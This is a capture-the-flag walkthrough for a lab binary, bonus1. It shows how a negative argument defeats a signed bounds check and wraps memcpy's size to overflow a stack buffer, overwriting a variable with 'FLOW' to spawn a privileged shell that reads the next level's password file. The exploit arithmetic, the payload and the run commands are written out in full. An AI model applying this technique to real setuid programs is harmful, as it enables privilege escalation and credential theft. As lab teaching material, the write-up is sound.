bonus1 - walkthrough
====================

Target: /home/user/bonus1/bonus1   (setuid + setgid bonus2)
Goal:   read /home/user/bonus2/.pass

1. The bug (signedness + truncation)
   main():
     n = atoi(argv[1]);            ; stored at esp+0x3c
     if (n > 9) return 1;          ; SIGNED compare -> only blocks n > 9
     memcpy(esp+0x14, argv[2], n*4);
     if (n == 0x574f4c46) execl("/bin/sh", "sh", NULL);   ; 0x574f4c46 = "FLOW"
   n is signed, so a NEGATIVE n passes "n > 9". The copy size n*4 is computed in
   32 bits and handed to memcpy as an unsigned size_t.

2. Offset (read straight from the disassembly)
   buf = esp+0x14, stored n = esp+0x3c -> 0x3c - 0x14 = 40 bytes apart. To
   overwrite all 4 bytes of n we need memcpy to copy 44 bytes.

3. Pick n so that n*4 = 44
     n = (44 - 2^32) / 4 = -1073741813  (0xC000000B)
   As a signed int it is <= 9 (passes the check); n*4 truncated to 32 bits = 44.

4. Payload  (Ressources/exploit.py)
     argv[1] = "-1073741813"
     payload = b"A"*40 + b"FLOW"      # 44 bytes; the "FLOW" lands on n at offset 40
   After memcpy, n == 0x574f4c46 -> execl("/bin/sh","sh",NULL).

5. Run
     $ python3 Ressources/exploit.py
     $ echo 'cat /home/user/bonus2/.pass' | ./bonus1 -1073741813 "$(cat payload)"
   execl spawns /bin/sh, which runs the piped command.

